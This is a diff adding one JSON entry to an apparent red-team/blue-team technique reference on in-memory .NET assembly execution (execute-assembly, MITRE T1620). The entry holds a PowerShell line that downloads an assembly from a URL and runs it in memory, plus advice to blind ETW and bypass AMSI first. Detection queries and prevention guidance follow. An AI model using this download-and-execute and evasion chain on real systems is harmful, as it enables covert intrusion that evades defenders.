@@ -1,0 +1,99 @@
+{
+  "id": "win-clr-execute-assembly",
+  "name": "In-Memory .NET Assembly Execution (execute-assembly / CLR hosting)",
+  "command": "Load a .NET assembly into memory and invoke its entry point without touching disk",
+  "description": "In-memory .NET execution loads an assembly directly from a byte array (via [Reflection.Assembly]::Load or native CLR hosting - ICLRRuntimeHost/ICLRMetaHost) and invokes its entry point, so offensive .NET tools (Rubeus, Seatbelt, SharpHound) run entirely in memory with no PE on disk. This is the mechanic behind Cobalt Strike execute-assembly and is a reflective/non-standard module load (T1620).",
+  "platform": "windows",
+  "type": "command",
+  "opsec": "moderate",
+  "category": "Defense Evasion",
+  "subcategory": "Defense Evasion",
+  "certifications": ["CRTP"],
+  "primary_cert": "CRTP",
+  "source": "MITRE ATT&CK T1620 (Reflective Code Loading); CLR hosting documentation",
+  "tags": ["execute-assembly", "clr-hosting", "in-memory", "dotnet", "reflective-loading", "defense-evasion"],
+  "mitre": ["T1620", "T1059.001"],
+  "exam": "exam-ok",
+  "notes": "=== TWO COMMON PATHS ===\n  1. Managed (PowerShell):\n     $b = (New-Object Net.WebClient).DownloadData('<url>')\n     [Reflection.Assembly]::Load($b).EntryPoint.Invoke($null,@(,[string[]]@('args')))\n  2. Native CLR hosting (unmanaged loader):\n     ICLRMetaHost -> ICLRRuntimeInfo -> ICorRuntimeHost/ICLRRuntimeHost -> load + ExecuteInDefaultAppDomain\n     # used by execute-assembly so you can run .NET from an unmanaged implant.\n\n=== WHY IT EVADES ===\n  - No .NET EXE on disk, so on-disk AV signatures never fire.\n  - Pairs with ETW patching (to blind Microsoft-Windows-DotNETRuntime) and AMSI bypass\n    (.NET assemblies ARE scanned by AMSI since .NET 4.8 / Windows 10).\n\n=== KEY DETECTION SURFACE (so pair with the blinds above) ===\n  - CLR loaded into a process that is not normally managed (clr.dll/clrjit.dll in e.g. a C2 stager).\n  - ETW .NET provider: assembly load events, Rundown.\n  - AMSI amsiScanBuffer of the assembly bytes (.NET 4.8+).\n\n=== ALTERNATIVES ===\n  Reflective DLL injection, PowerShell IEX cradle (scriptable, but AMSI-scanned),\n  BOF (beacon object files) for small C capabilities.",
+  "examples": [
+    {
+      "label": "Load and run a .NET assembly from bytes in PowerShell",
+      "command": "[Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null,@(,[string[]]@()))"
+    },
+    {
+      "label": "Cobalt-style operator syntax (reference)",
+      "command": "execute-assembly C:\\tools\\Seatbelt.exe -group=system"
+    }
+  ],
+  "references": [
+    {
+      "title": "MITRE ATT&CK T1620 - Reflective Code Loading",
+      "url": "https://attack.mitre.org/techniques/T1620/"
+    },
+    {
+      "title": "Microsoft - Hosting the Common Language Runtime",
+      "url": "https://learn.microsoft.com/en-us/dotnet/framework/unmanaged-api/hosting/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "amsi-bypass",
+      "note": ".NET assemblies are AMSI-scanned on 4.8+, so bypass AMSI first.",
+      "rel": "prereq"
+    },
+    {
+      "id": "win-etw-patching",
+      "note": "Blind the .NET ETW provider before the in-memory load.",
+      "rel": "next"
+    },
+    {
+      "id": "process-injection-runner",
+      "note": "Shellcode injection is the unmanaged analogue of in-memory loading.",
+      "rel": "alternative"
+    }
+  ],
+  "defense": {
+    "why_it_works": "The CLR exposes documented APIs to load an assembly from a byte array and invoke it, and native hosting interfaces let an unmanaged process spin up the runtime on demand. Because the assembly never lands on disk, file-based detection has nothing to scan; only in-memory and ETW/AMSI telemetry observe it.",
+    "prerequisites": "Code execution in a process that can host the CLR (or already does). No admin required. On .NET 4.8+/Windows 10 the loaded bytes are passed to AMSI unless AMSI is already bypassed.",
+    "impact": "T1620 Reflective Code Loading. Runs full .NET offensive tooling (credential, recon, lateral-movement tools) in memory under a benign process, with no dropped executable.",
+    "detection": "Alert on clr.dll/clrjit.dll/mscoree.dll loading into a process that is not a known .NET application; the Microsoft-Windows-DotNETRuntime ETW provider assembly-load and AMSI assembly-scan events; AMSI amsiScanBuffer results on unsigned in-memory assemblies; EDR managed-memory scanning. If ETW is silenced, the silence plus a CLR load in an odd host is itself suspicious.",
+    "artifacts": "Sysmon EID 7 (ImageLoad) of clr.dll/clrjit.dll in an unexpected process; Microsoft-Windows-DotNETRuntime ETW events; AMSI 1033 scan events for .NET content; EDR in-memory .NET module detections.",
+    "splunk_spl": "index=sysmon EventCode=7 ImageLoaded IN (\"*clr.dll\",\"*clrjit.dll\",\"*mscoree.dll\")\n| search NOT Image IN (\"*powershell.exe\",\"*powershell_ise.exe\",\"*w3wp.exe\",\"*devenv.exe\")\n| stats count by Image, ImageLoaded, Computer",
+    "elastic_kql": "event.code:\"7\" and dll.name:(clr.dll or clrjit.dll or mscoree.dll) and not process.name:(powershell.exe or w3wp.exe or devenv.exe)",
+    "sentinel_kql": "DeviceImageLoadEvents\n| where FileName in~ (\"clr.dll\",\"clrjit.dll\",\"mscoree.dll\")\n| where InitiatingProcessFileName !in~ (\"powershell.exe\",\"powershell_ise.exe\",\"w3wp.exe\",\"devenv.exe\",\"dotnet.exe\")\n| project Timestamp, DeviceName, InitiatingProcessFileName, FileName",
+    "sigma_rules": "image_load_win_clr_in_unmanaged_process",
+    "prevention": "Keep AMSI enforced and enable Tamper Protection so .NET content is scanned on load; ship EDR with managed in-memory scanning; enforce WDAC to constrain which assemblies can execute; monitor the .NET ETW provider centrally and alert on CLR loads in non-.NET processes; baseline which hosts legitimately host the runtime.",
+    "sources": [
+      "https://attack.mitre.org/techniques/T1620/",
+      "https://learn.microsoft.com/en-us/dotnet/framework/unmanaged-api/hosting/"
+    ],
+    "detections": [
+      {
+        "platform": "splunk",
+        "name": "CLR loaded into a non-.NET host process",
+        "logic": "index=sysmon EventCode=7 ImageLoaded IN (\"*clr.dll\",\"*clrjit.dll\",\"*mscoree.dll\") NOT Image IN (\"*powershell.exe\",\"*w3wp.exe\",\"*devenv.exe\",\"*dotnet.exe\")\n| stats count by Image, ImageLoaded, Computer",
+        "data_source": "sysmon",
+        "attack": ["T1620"],
+        "fidelity": "behavioral",
+        "confidence": "medium",
+        "false_positives": "Any legitimate app that embeds the CLR (installers, management agents)",
+        "tuning": "Build a per-environment allowlist of CLR-hosting processes"
+      },
+      {
+        "platform": "sentinel",
+        "name": "AMSI scan of unsigned in-memory .NET content",
+        "logic": "DeviceEvents\n| where ActionType == \"AmsiScan\" and AdditionalFields has \"dotnet\"\n| where AdditionalFields has_any (\"Rubeus\",\"Seatbelt\",\"SharpHound\",\"unsigned\")\n| project Timestamp, DeviceName, InitiatingProcessFileName, AdditionalFields",
+        "data_source": "defender-endpoint",
+        "attack": ["T1620", "T1059.001"],
+        "fidelity": "signature",
+        "confidence": "medium",
+        "false_positives": "Internal .NET tooling flagged by name heuristics",
+        "tuning": "Tune name heuristics; prefer behavioral correlation with ETW gaps"
+      }
+    ],
+    "visibility": {
+      "requires": ["sysmon", "etw"],
+      "better_with": ["edr", "defender-endpoint", "powershell"]
+    }
+  }
+}
